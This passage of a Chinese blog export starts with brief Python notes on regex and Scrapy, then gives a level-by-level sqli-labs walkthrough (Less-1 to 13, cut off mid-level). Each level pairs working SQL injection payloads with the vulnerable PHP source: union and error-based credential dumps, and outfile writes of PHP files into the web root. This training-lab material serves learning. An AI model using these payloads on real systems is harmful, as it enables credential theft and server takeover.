<h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><p>匹配中文字符：<code>[\u4e00-\u9fa5]</code></p>
<p>IP地址：<code>((?:(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d)\\.)&#123;3&#125;(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d))</code></p>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python笔记/image-20200215171503658.png" style="zoom:67%;" loading="lazy">

<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python笔记/image-20200215171657835.png" style="zoom:67%;" loading="lazy">

<h3 id="compile函数"><a href="#compile函数" class="headerlink" title="compile函数"></a>compile函数</h3><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python笔记/image-20200215172803741.png" style="zoom:67%;" loading="lazy">

<h3 id="Match对象"><a href="#Match对象" class="headerlink" title="Match对象"></a>Match对象</h3><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python笔记/image-20200215173026458.png" style="zoom:67%;" loading="lazy">

<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python笔记/image-20200215173130093.png" style="zoom:67%;" loading="lazy">

<h3 id="最小匹配（非贪婪）"><a href="#最小匹配（非贪婪）" class="headerlink" title="最小匹配（非贪婪）"></a>最小匹配（非贪婪）</h3><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python笔记/image-20200215173716539.png" style="zoom:67%;" loading="lazy">

<h2 id="string"><a href="#string" class="headerlink" title="string"></a>string</h2><p><a href="https://blog.csdn.net/github_36601823/article/details/77815013">参考</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python%E7%AC%94%E8%AE%B0/20170903091548442.png" alt loading="lazy"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python%E7%AC%94%E8%AE%B0/20170903091615951.png" alt loading="lazy"></p>
<h1 id="scrapy框架"><a href="#scrapy框架" class="headerlink" title="scrapy框架"></a>scrapy框架</h1><h2 id="主要结构"><a href="#主要结构" class="headerlink" title="主要结构"></a>主要结构</h2><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python笔记/image-20200217193013443.png" style="zoom:67%;" loading="lazy">

<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python笔记/image-20200217193035116.png" style="zoom:67%;" loading="lazy">

<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python笔记/image-20200217193058864.png" style="zoom:67%;" loading="lazy">

<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python笔记/image-20200217193115484.png" style="zoom:67%;" loading="lazy">

<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python笔记/image-20200217193155782.png" style="zoom:67%;" loading="lazy">

<h2 id="工程目录"><a href="#工程目录" class="headerlink" title="工程目录"></a>工程目录</h2><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python笔记/image-20200217193245769.png" style="zoom:67%;" loading="lazy">

<h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><h3 id="Request"><a href="#Request" class="headerlink" title="Request"></a>Request</h3><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python笔记/image-20200217193435792.png" style="zoom:67%;" loading="lazy">

<h3 id="Response"><a href="#Response" class="headerlink" title="Response"></a>Response</h3><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/python笔记/image-20200217193520056.png" style="zoom:67%;" loading="lazy">]]></content>
      <categories>
        <category>备忘录</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Sqli-labs靶场</title>
    <url>/posts/e5cd0178/</url>
    <content><![CDATA[<h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h3><p>payload:</p>
<pre class="language-mssql" data-language="mssql"><code class="language-mssql">?id&#x3D;0&#39; union select database(),group_concat(username),group_concat(password) from users--+</code></pre>

<p>php:</p>
<pre class="language-mssql" data-language="mssql"><code class="language-mssql">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;;</code></pre>

<span id="more"></span>

<h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><p>payload:</p>
<pre class="language-mssql" data-language="mssql"><code class="language-mssql">?id&#x3D;0 union select 1,group_concat(username),group_concat(password) from users --+</code></pre>

<p>php:</p>
<pre class="language-mssql" data-language="mssql"><code class="language-mssql">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1&quot;;</code></pre>

<h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><p>payload:</p>
<pre class="language-mssql" data-language="mssql"><code class="language-mssql">?id&#x3D;0&#39;) union select 1,group_concat(username),group_concat(password) from users --+</code></pre>

<p>php:</p>
<pre class="language-mssql" data-language="mssql"><code class="language-mssql">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;(&#39;$id&#39;) LIMIT 0,1&quot;;</code></pre>

<h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><p>payload:</p>
<pre class="language-mssql" data-language="mssql"><code class="language-mssql">?id&#x3D;0&quot;) union select 1,group_concat(username),group_concat(password) from users --+</code></pre>

<p>php:</p>
<pre class="language-mssql" data-language="mssql"><code class="language-mssql">$id &#x3D; &#39;&quot;&#39; . $id . &#39;&quot;&#39;;
$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;($id) LIMIT 0,1&quot;;</code></pre>

<h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><p>payload:</p>
<pre class="language-mssql" data-language="mssql"><code class="language-mssql">?id&#x3D;0&#39; and extractvalue(1,concat(1,(select group_concat(username,&#39;:&#39;,password) from users where username!&#x3D;&#39;此处加入想排除的字符，可往后查找&#39;)))--+</code></pre>

<p>php:</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span>
<span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
  	<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font size="5" color="#FFFF00">'</span><span class="token punctuation">;</span>	
  	<span class="token keyword">echo</span> <span class="token string single-quoted-string">'You are in...........'</span><span class="token punctuation">;</span>
  	<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
    	<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>
  	<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span> 
	<span class="token punctuation">&#123;</span>
	<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font size="3" color="#FFFF00">'</span><span class="token punctuation">;</span>
	<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>&lt;/font>"</span><span class="token punctuation">;</span>	
	<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font color= "#0000ff" font size= 3>'</span><span class="token punctuation">;</span>	
	<span class="token punctuation">&#125;</span></code></pre>

<h3 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h3><p>payload:</p>
<pre class="language-mssql" data-language="mssql"><code class="language-mssql">?id&#x3D;0&quot; and extractvalue(1,concat(1,(select group_concat(username,&#39;:&#39;,password) from users where username!&#x3D;&#39;此处加入想排除的字符，可往后查找&#39;)))--+</code></pre>

<p>php:</p>
<pre class="language-mssql" data-language="mssql"><code class="language-mssql">$id &#x3D; &#39;&quot;&#39;.$id.&#39;&quot;&#39;;
$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1&quot;;
下面的同Less-5</code></pre>

<h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h3><p>Method：into outfile 文件写入操作，如下：</p>
<p>payload:</p>
<pre class="language-mssql" data-language="mssql"><code class="language-mssql">?id&#x3D;1&#39;)) union select 1,2,&#39;&#39; into outfile &quot;C:\\xampp\\htdocs\\sqli\\Less-7\\1.php&quot; --+</code></pre>

<p>php:</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id=(('<span class="token interpolation"><span class="token variable">$id</span></span>')) LIMIT 0,1"</span><span class="token punctuation">;</span>
<span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
  	<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font color= "#FFFF00">'</span><span class="token punctuation">;</span>	
  	<span class="token keyword">echo</span> <span class="token string single-quoted-string">'You are in.... Use outfile......'</span><span class="token punctuation">;</span>
  	<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
  	<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>
  	<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span> 
	<span class="token punctuation">&#123;</span>
	<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font color= "#FFFF00">'</span><span class="token punctuation">;</span>
	<span class="token keyword">echo</span> <span class="token string single-quoted-string">'You have an error in your SQL syntax'</span><span class="token punctuation">;</span>
	<span class="token comment">//print_r(mysql_error());</span>
	<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>  
	<span class="token punctuation">&#125;</span></code></pre>

<h3 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h3><p>payload:</p>
<pre class="language-mssql" data-language="mssql"><code class="language-mssql">?id&#x3D;1&#39; union select 1,2,&#39;&#39; into outfile &quot;C:\\xampp\\htdocs\\sqli\\Less-8\\1.php&quot; --+</code></pre>

<p>php:</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span>
<span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
  	<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font size="5" color="#FFFF00">'</span><span class="token punctuation">;</span>	
  	<span class="token keyword">echo</span> <span class="token string single-quoted-string">'You are in...........'</span><span class="token punctuation">;</span>
  	<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
    	<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>
  	<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span> 
	<span class="token punctuation">&#123;</span>
	<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font size="5" color="#FFFF00">'</span><span class="token punctuation">;</span>
	<span class="token comment">//echo 'You are in...........';</span>
	<span class="token comment">//print_r(mysql_error());</span>
	<span class="token comment">//echo "You have an error in your SQL syntax";</span>
	<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>&lt;/font>"</span><span class="token punctuation">;</span>	
	<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font color= "#0000ff" font size= 3>'</span><span class="token punctuation">;</span>	
	<span class="token punctuation">&#125;</span></code></pre>

<h3 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h3><p>payload:</p>
<pre class="language-mssql" data-language="mssql"><code class="language-mssql">?id&#x3D;1&#39; union select 1,2,&#39;&#39; into outfile &quot;C:\\xampp\\htdocs\\sqli\\Less-9\\1.php&quot; --+</code></pre>

<p>php:</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span>
<span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
  	<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font size="5" color="#FFFF00">'</span><span class="token punctuation">;</span>	
  	<span class="token keyword">echo</span> <span class="token string single-quoted-string">'You are in...........'</span><span class="token punctuation">;</span>
  	<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
    	<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>
  	<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span> 
	<span class="token punctuation">&#123;</span>
	<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font size="5" color="#FFFF00">'</span><span class="token punctuation">;</span>
	<span class="token keyword">echo</span> <span class="token string single-quoted-string">'You are in...........'</span><span class="token punctuation">;</span>
	<span class="token comment">//print_r(mysql_error());</span>
	<span class="token comment">//echo "You have an error in your SQL syntax";</span>
	<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>&lt;/font>"</span><span class="token punctuation">;</span>	
	<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font color= "#0000ff" font size= 3>'</span><span class="token punctuation">;</span>	
	<span class="token punctuation">&#125;</span></code></pre>

<h3 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h3><p>payload:</p>
<pre class="language-mssql" data-language="mssql"><code class="language-mssql">?id&#x3D;1&quot; union select 1,2,&#39;&#39; into outfile &quot;C:\\xampp\\htdocs\\sqli\\Less-10\\1.php&quot; --+</code></pre>

<p>php:</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'"'</span><span class="token operator">.</span><span class="token variable">$id</span><span class="token operator">.</span><span class="token string single-quoted-string">'"'</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id=<span class="token interpolation"><span class="token variable">$id</span></span> LIMIT 0,1"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
<span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
  	<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font size="5" color="#FFFF00">'</span><span class="token punctuation">;</span>	
  	<span class="token keyword">echo</span> <span class="token string single-quoted-string">'You are in...........'</span><span class="token punctuation">;</span>
  	<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
    	<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>
  	<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span> 
	<span class="token punctuation">&#123;</span>
	
	<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font size="5" color="#FFFF00">'</span><span class="token punctuation">;</span>
	<span class="token keyword">echo</span> <span class="token string single-quoted-string">'You are in...........'</span><span class="token punctuation">;</span>
	<span class="token comment">//print_r(mysql_error());</span>
	<span class="token comment">//echo "You have an error in your SQL syntax";</span>
	<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>&lt;/font>"</span><span class="token punctuation">;</span>	
	<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font color= "#0000ff" font size= 3>'</span><span class="token punctuation">;</span>	
	
	<span class="token punctuation">&#125;</span></code></pre>

<h3 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h3><p>payload:</p>
<pre class="language-mssql" data-language="mssql"><code class="language-mssql">uname: 1&#39; union select group_concat(username),group_concat(password) from users;#</code></pre>

<p>php:</p>
<pre class="language-php" data-language="php"><code class="language-php">@<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT username, password FROM users WHERE username='<span class="token interpolation"><span class="token variable">$uname</span></span>' and password='<span class="token interpolation"><span class="token variable">$passwd</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span>
	<span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
  		<span class="token comment">//echo '&lt;font color= "#0000ff">';	</span>
  		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font color= "#FFFF00" font size = 4>'</span><span class="token punctuation">;</span>
		<span class="token comment">//echo " You Have successfully logged in\n\n " ;</span>
		<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font size="3" color="#0000ff">'</span><span class="token punctuation">;</span>	
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string single-quoted-string">'Your Login name:'</span><span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string single-quoted-string">'Your Password:'</span> <span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img src="../images/flag.jpg"  />'</span><span class="token punctuation">;</span>	
  		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>
  	<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span>  
	<span class="token punctuation">&#123;</span>
		<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font color= "#0000ff" font size="3">'</span><span class="token punctuation">;</span>
		<span class="token comment">//echo "Try again looser";</span>
		<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img src="../images/slap.jpg" />'</span><span class="token punctuation">;</span>	
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>  
	<span class="token punctuation">&#125;</span></code></pre>

<h3 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h3><p>payload:</p>
<pre class="language-mssql" data-language="mssql"><code class="language-mssql">uname: 1&quot;) union select group_concat(username),group_concat(password) from users;#</code></pre>

<p>php:</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$uname</span><span class="token operator">=</span><span class="token string single-quoted-string">'"'</span><span class="token operator">.</span><span class="token variable">$uname</span><span class="token operator">.</span><span class="token string single-quoted-string">'"'</span><span class="token punctuation">;</span>
	<span class="token variable">$passwd</span><span class="token operator">=</span><span class="token string single-quoted-string">'"'</span><span class="token operator">.</span><span class="token variable">$passwd</span><span class="token operator">.</span><span class="token string single-quoted-string">'"'</span><span class="token punctuation">;</span> 
	@<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT username, password FROM users WHERE username=(<span class="token interpolation"><span class="token variable">$uname</span></span>) and password=(<span class="token interpolation"><span class="token variable">$passwd</span></span>) LIMIT 0,1"</span><span class="token punctuation">;</span>
	<span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
  		<span class="token comment">//echo '&lt;font color= "#0000ff">';	</span>
  		
  		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font color= "#FFFF00" font size = 4>'</span><span class="token punctuation">;</span>
		<span class="token comment">//echo " You Have successfully logged in " ;</span>
		<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font size="3" color="#0000ff">'</span><span class="token punctuation">;</span>	
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string single-quoted-string">'Your Login name:'</span><span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string single-quoted-string">'Your Password:'</span> <span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img src="../images/flag.jpg"   />'</span><span class="token punctuation">;</span>	
		
  		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>
  	<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span>  
	<span class="token punctuation">&#123;</span>
		<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font color= "#0000ff" font size="3">'</span><span class="token punctuation">;</span>
		<span class="token comment">//echo "Try again looser";</span>
		<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img src="../images/slap.jpg"   />'</span><span class="token punctuation">;</span>	
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>  
	<span class="token punctuation">&#125;</span></code></pre>

<h3 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h3><p>payload:</p>
<pre class="language-mssql" data-language="mssql"><code class="language-mssql">uname: 1&#39;) and extractvalue(1,concat(1,(select group_concat(username,&#39;:&#39;,password) from users where username!&#x3D;&#39;此处加入想排除的字符，可往后查找&#39; )));#</code></pre>

<p>php:</p>
<pre class="language-php" data-language="php"><code class="language-php">@<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT username, password FROM users WHERE username=('<span class="token interpolation"><span class="token variable">$uname</span></span>') and password=('<span class="token interpolation"><span class="token variable">$passwd</span></span>') LIMIT 0,1"</span><span class="token punctuation">;</span>
	<span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
  		<span class="token comment">//echo '&lt;font color= "#0000ff">';	</span>
  		
  		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font color= "#FFFF00" font size = 4>'</span><span class="token punctuation">;</span>
		<span class="token comment">//echo " You Have successfully logged in " ;</span>
		<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font size="3" color="#0000ff">'</span><span class="token punctuation">;</span>	
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
		<span class="token comment">//echo 'Your Login name:'. $row['username'];</span>
		<span class="token comment">//echo "&lt;br>";</span>
		<span class="token comment">//echo 'Your Password:' .$row['password'];</span>
		<span class="token comment">//echo "&lt;br>";</span>
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img src="../images/flag.jpg"   />'</span><span class="token punctuation">;</span>	
		
  		<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>
  	<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span>  
	<span class="token punctuation">&#123;</span>
